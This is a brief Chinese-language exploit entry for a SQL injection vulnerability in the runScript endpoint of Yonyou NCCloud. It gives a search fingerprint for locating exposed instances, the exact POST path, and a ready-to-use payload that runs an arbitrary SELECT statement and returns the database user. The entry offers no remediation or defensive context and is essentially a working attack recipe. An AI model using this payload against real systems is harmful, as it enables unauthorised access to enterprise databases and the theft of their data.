# 用友NCCloud系统runScript存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /ncchr/attendScript/internal/runScript HTTP/1.1`

**Payload**
```
key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
```